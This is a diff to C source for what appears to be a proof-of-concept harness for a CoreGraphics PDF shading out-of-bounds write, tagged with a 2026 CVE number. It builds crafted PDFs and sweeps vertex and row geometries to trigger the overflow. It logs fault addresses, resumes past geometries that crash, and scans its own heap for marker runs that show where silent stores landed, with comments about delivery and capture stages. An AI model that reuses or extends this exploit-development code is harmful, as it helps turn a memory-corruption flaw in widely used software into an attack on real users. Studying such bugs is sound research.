@@ -39,7 +39,9 @@
 #include <pthread.h>
 #include <math.h>
 #include <unistd.h>
+#include <fcntl.h>
 #include <dlfcn.h>
+#include <sys/stat.h>
 #include <sys/mman.h>
 #include <sys/ucontext.h>
 #include <mach/mach.h>
@@ -640,18 +642,21 @@ static const cgvar g_cg_vars[CG_NVARS] = {
     { "F_c16",   4, 1, 16, 8,  8, 136, 256, 256, 1 },
     // 128 rows, the shape the CFData harness uses
     { "H_r128",  4, 1, 32, 8,  8, 136, 128, 128, 1 },
+    // full stream, 34816 vertices. Faults on 27.0.0, so it moves ahead of the
+    // ladder: a fault here is clean (the store hits an unmapped page and never
+    // lands), so everything the ladder needs to measure gets measured after it.
+    { "G_1024",  4, 1, 32, 8,  8, 136, 256,1024, 1 },
     // Overflow-length ladder: /C0 keeps its 1024 entries, the stream shrinks.
-    // The vertex count sets how many times the sample function is evaluated, so
-    // this separates "one call copies 1024 doubles" from "every vertex copies
-    // them again". A single vertex that still faults means the damage is inside
-    // one evaluation; small streams that survive mean the overflow accumulates.
-    { "K_v1",    4, 1, 32, 8,  8,   1,   1,1024, 1 },
+    // VerticesPerRow must be >= 2, so K_v1 was never a valid shading — CG
+    // refused to draw it and the "hits=0" reading was meaningless. The ladder
+    // starts at two vertices and doubles from there. A small stream that faults
+    // means the damage happens inside one row; streams that survive mean the
+    // overflow accumulates per evaluation, and the surviving ones are the
+    // dangerous case: a silent store into mapped heap instead of a clean fault.
+    { "K_v2",    4, 1, 32, 8,  8,   2,   1,1024, 1 },
     { "K_v4",    4, 1, 32, 8,  8,   2,   2,1024, 1 },
     { "K_v16",   4, 1, 32, 8,  8,   4,   4,1024, 1 },
     { "K_v64",   4, 1, 32, 8,  8,   8,   8,1024, 1 },
-    // full stream, 34816 vertices. Faults on 27.0.0, so it goes last: the sweep
-    // stops here and everything above it gets measured first.
-    { "G_1024",  4, 1, 32, 8,  8, 136, 256,1024, 1 },
 };
 
 // Builder entry point for the other translation units. Returns a malloc'd PDF
@@ -708,6 +713,166 @@ static void cg_tail_scan(uintptr_t far) {
         p = a;
     }
 }
+
+// ---------------------------------------------------------------------------
+// Crash attribution. A geometry that kills the process is only useful if the
+// log names it, so the sweep writes its index to disk with fsync *before* the
+// render and resumes past that index on the next launch. Same contract the
+// IOSurface geometry sweep already uses: the killer is the last "[CGS] running"
+// line with no result line under it.
+// ---------------------------------------------------------------------------
+
+static void cg_state_path(char *out, size_t cap, const char *leaf) {
+    const char *home = getenv("HOME");
+    if (!home || !*home) home = "/tmp";
+    snprintf(out, cap, "%s/Documents/F1OOB-PoC/%s", home, leaf);
+}
+
+static int cg_state_read(const char *leaf) {
+    char path[1024];
+    cg_state_path(path, sizeof(path), leaf);
+    FILE *f = fopen(path, "rb");
+    if (!f) return 0;
+    int v = 0;
+    if (fscanf(f, "%d", &v) != 1) v = 0;
+    fclose(f);
+    return v;
+}
+
+static void cg_state_write(const char *leaf, int v) {
+    char path[1024];
+    cg_state_path(path, sizeof(path), leaf);
+    char buf[32];
+    int n = snprintf(buf, sizeof(buf), "%d\n", v);
+    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) return;
+    ssize_t wrote = write(fd, buf, (size_t)n);
+    (void)wrote;
+    fsync(fd);
+    close(fd);
+}
+
+// malloc() calls abort() when it finds its own metadata damaged, and abort is
+// not a SIGSEGV, so the render handler never sees it. Trap it, leave a marker
+// next to the log, then re-raise with the default action so the system still
+// writes an .ips entry naming this frame.
+static char g_abort_path[1024] = {0};
+static volatile sig_atomic_t g_abort_armed = 0;
+
+static void cg_abort_trap(int sig) {
+    if (g_abort_armed && g_abort_path[0]) {
+        int fd = open(g_abort_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd >= 0) {
+            ssize_t w = write(fd, "abort\n", 6);
+            (void)w;
+            fsync(fd);
+            close(fd);
+        }
+    }
+    signal(sig, SIG_DFL);
+    raise(sig);
+}
+
+static void cg_abort_arm(void) {
+    cg_state_path(g_abort_path, sizeof(g_abort_path), "abort.txt");
+    unlink(g_abort_path);
+    g_abort_armed = 1;
+    signal(SIGABRT, cg_abort_trap);
+}
+
+// ---------------------------------------------------------------------------
+// Tag scan. A geometry that faults is safe: the store never lands. A geometry
+// that returns without a fault is the suspicious one — it may have written its
+// marker into whatever heap block sat past the end of the sample buffer, and
+// the process then dies later inside malloc. This walks every writable region
+// in our own address space looking for runs of the marker we told the PDF to
+// emit. A run means a silent store happened; its address says where.
+// ---------------------------------------------------------------------------
+
+static int cg_tag_scan(const cgvar *v, uint64_t tag, uint64_t budget) {
+    cg_vr_fn_t fn = cg_region_fn(NULL);
+    if (!fn) { cg_logf("[TAG] %s no region call", v->name); return 0; }
+
+    uint8_t *buf = (uint8_t *)malloc(1u << 20);
+    if (!buf) { cg_logf("[TAG] %s no buffer", v->name); return 0; }
+
+    uint64_t scanned = 0;
+    uint64_t runs = 0;
+    int printed = 0;
+    vm_address_t addr = 0;
+
+    while (scanned < budget) {
+        vm_address_t region = addr;
+        vm_size_t size = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj = MACH_PORT_NULL;
+        kern_return_t kr = fn(mach_task_self(), &region, &size,
+                              VM_REGION_BASIC_INFO_64,
+                              (vm_region_info_t)&info, &count, &obj);
+        if (obj != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), obj);
+        if (kr != KERN_SUCCESS || size == 0) break;
+
+        uint64_t rEnd = (uint64_t)region + (uint64_t)size;
+        if (rEnd <= (uint64_t)region) break;
+
+        // Skip the guard/shared-cache regions. Only writable, only sane sizes:
+        // a multi-gigabyte mapping would blow the budget on its first chunk.
+        if ((info.protection & VM_PROT_WRITE) && size <= (4ull << 20)) {
+            uint64_t off = 0;
+            while (off < (uint64_t)size && scanned < budget) {
+                size_t chunk = (size_t)((uint64_t)size - off);
+                if (chunk > (1u << 20)) chunk = 1u << 20;
+                vm_size_t got = 0;
+                kern_return_t rr = vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)(region + off), (vm_size_t)chunk,
+                        (vm_address_t)buf, &got);
+                if (rr == KERN_SUCCESS && got == chunk) {
+                    size_t o = 0;
+                    while (o + 8 <= chunk) {
+                        uint64_t w;
+                        memcpy(&w, buf + o, 8);
+                        if (w != tag) { o += 8; continue; }
+                        size_t run = 0;
+                        size_t p = o;
+                        while (p + 8 <= chunk) {
+                            uint64_t w2;
+                            memcpy(&w2, buf + p, 8);
+                            if (w2 != tag) break;
+                            run++;
+                            p += 8;
+                        }
+                        // Fourteen words is 112 bytes of the same double in a
+                        // row. A correct evaluation writes four (one per
+                        // component); anything longer than that is either the
+                        // sample table or a runaway, and the caller compares
+                        // the count against the pre-render baseline.
+                        if (run >= (size_t)14) {
+                            runs++;
+                            if (printed < 8) {
+                                printed++;
+                                cg_logf("[TAG] %s run=%zu at=0x%llx",
+                                        v->name, run,
+                                        (unsigned long long)(region + off + o));
+                            }
+                        }
+                        o = p;
+                    }
+                }
+                off += chunk;
+                scanned += chunk;
+            }
+        }
+        addr = (vm_address_t)rEnd;
+    }
+
+    free(buf);
+    cg_logf("[TAG] %s scanned=0x%llx markerRuns=%llu", v->name,
+            (unsigned long long)scanned, (unsigned long long)runs);
+    return (int)runs;
+}
+
+
 
 // ---------------------------------------------------------------------------
 // Guarded call. Runs a block under a SIGSEGV/SIGBUS handler that unwinds back
@@ -786,8 +951,33 @@ void cg_section(void (*logcb)(const char *)) {
     int win = -1;
     char winName[32] = "none";
 
+    cg_abort_arm();
+
     // ---- CG-1: trigger sweep ----
+    int sweepStart = cg_state_read("cg-sweep.txt");
+    if (sweepStart < 0) sweepStart = 0;
+    if (sweepStart > nvars) sweepStart = nvars;
+    cg_logf("[CGS] sweep resume=%d of %d", sweepStart, nvars);
+    if (sweepStart > 0)
+        cg_logf("[CGS] an earlier launch stopped before index %d - that geometry is the killer",
+                sweepStart);
+
     for (int i = 0; i < nvars; i++) {
+        // The K ladder is the part that can die silently inside malloc, so it
+        // runs last, after the consumer stages, in cg_tail_section.
+        if (strncmp(vars[i].name, "K_", 2) == 0) continue;
+        // A resumed launch skips what already ran, but the capture stage needs
+        // a live fault address to decode, so the geometry that faults is always
+        // re-armed. It stops on an unmapped page and never writes, which is why
+        // re-running it is safe.
+        int rearm = (i < sweepStart);
+        if (rearm && strcmp(vars[i].name, "G_1024") != 0) continue;
+        if (rearm) cg_logf("[CGS] re-arming i=%d %s (needed for capture)", i, vars[i].name);
+
+        if (!rearm) cg_state_write("cg-sweep.txt", i + 1);
+        cg_logf("[CGS] running i=%d %s vpr=%d rows=%d c0=%d",
+                i, vars[i].name, vars[i].vpr, vars[i].rows, vars[i].c0count);
+
         char err[128] = {0};
         size_t len = 0;
         uint8_t *pdf = cg_build_pdf(&vars[i], 0x3FF0000000000000ULL,
@@ -982,4 +1172,112 @@ void cg_section(void (*logcb)(const char *)) {
     sigaction(SIGSEGV, &oldsegv, NULL);
     if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
     cg_logf("[CG] === ladder done ===");
+}
+
+// ============================================================================
+// Tail: the overflow-length ladder
+// ============================================================================
+
+// Everything before this point either returns without touching the heap or
+// faults on an unmapped page and stops dead. The ladder is the only stage where
+// a store can land somewhere mapped and quietly damage a neighbour, so it runs
+// after the delivery stages and reports its own progress to disk. If this takes
+// the process down, the next launch resumes at the next rung and the log keeps
+// the name of the one that died.
+void cg_tail_section(void (*logcb)(const char *)) {
+    g_log = logcb;
+
+    cg_logf("[CGK] === overflow ladder ===");
+
+    struct sigaction sa, oldsegv, oldbus;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_sigaction = cg_fault;
+    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
+    sigemptyset(&sa.sa_mask);
+    if (sigaction(SIGSEGV, &sa, &oldsegv) != 0) {
+        cg_logf("[CGK] sigaction SEGV failed");
+        return;
+    }
+    int haveBus = (sigaction(SIGBUS, &sa, &oldbus) == 0);
+    cg_abort_arm();
+
+    const char *home = getenv("HOME");
+    if (!home || !*home) home = "/tmp";
+    char path[1024];
+    snprintf(path, sizeof(path), "%s/Documents/cve_2026_112611.pdf", home);
+
+    int start = cg_state_read("cg-tail.txt");
+    if (start < 0) start = 0;
+    if (start > CG_NVARS) start = CG_NVARS;
+    cg_logf("[CGK] resume=%d laneValue=0x%llx", start,
+            (unsigned long long)CG_REDIR_C0);
+    if (start > 0)
+        cg_logf("[CGK] an earlier launch stopped before lane index %d", start);
+
+    int ran = 0, faulted = 0, grew = 0;
+    int lane = 0;
+    int baseRuns = cg_tag_scan(&g_cg_vars[0], CG_REDIR_C0, 96ull << 20);
+    cg_logf("[CGK] tag baseline runs=%d (before any lane)", baseRuns);
+
+    for (int i = 0; i < CG_NVARS; i++) {
+        const cgvar *v = &g_cg_vars[i];
+        if (strncmp(v->name, "K_", 2) != 0) continue;
+        int myLane = lane++;
+
+        if (myLane < start) continue;
+
+        cg_state_write("cg-tail.txt", myLane + 1);
+        cg_logf("[CGK] running lane=%d %s vpr=%d rows=%d verts=%d c0=%d",
+                myLane, v->name, v->vpr, v->rows, v->vpr * v->rows, v->c0count);
+
+        char err[128] = {0};
+        size_t len = 0;
+        uint8_t *pdf = cg_build_pdf(v, CG_REDIR_C0, CG_REDIR_C0, NULL, &len,
+                                    err, sizeof(err));
+        if (!pdf) {
+            cg_logf("[CGK] %s build FAILED: %s", v->name, err);
+            continue;
+        }
+        if (cg_write_file(pdf, len, path) != 0) {
+            cg_logf("[CGK] %s write FAILED", v->name);
+            free(pdf);
+            continue;
+        }
+        free(pdf);
+
+        cg_hit = 0; cg_far = 0; cg_pc = 0; cg_insn = 0; cg_wnr = -1;
+        cg_recursive = 0;
+        cg_mode = CGM_OBSERVE;
+        int done = cg_render_file(path, err, sizeof(err));
+        cg_mode = CGM_OFF;
+        ran++;
+
+        cg_logf("[CGK] %s bytes=%zu render=%d hits=%d far=0x%llx wnr=%d insn=0x%08x rec=%d err=%s",
+                v->name, len, done, (int)cg_hit,
+                (unsigned long long)cg_far, (int)cg_wnr, (unsigned)cg_insn,
+                (int)cg_recursive, err[0] ? err : "-");
+
+        if (cg_hit > 0) {
+            faulted++;
+            cg_tail_scan(cg_far);
+            continue;
+        }
+
+        // No fault. Either the shading was rejected before it ran, or the store
+        // landed in mapped memory. The tag count says whether the marker now
+        // sits in more places than before the render; it is a hint, not a
+        // verdict, because a successful render also leaves markers behind.
+        int runs = cg_tag_scan(v, CG_REDIR_C0, 96ull << 20);
+        if (runs > baseRuns) {
+            grew++;
+            cg_logf("[CGK] %s marker count rose %d -> %d after a no-fault render",
+                    v->name, baseRuns, runs);
+        }
+    }
+
+    cg_state_write("cg-tail.txt", lane);
+    cg_logf("[CGK] lanes=%d faulted=%d markerGrew=%d", ran, faulted, grew);
+    sigaction(SIGSEGV, &oldsegv, NULL);
+    if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
+    cg_logf("[CGK] === ladder done ===");
 }
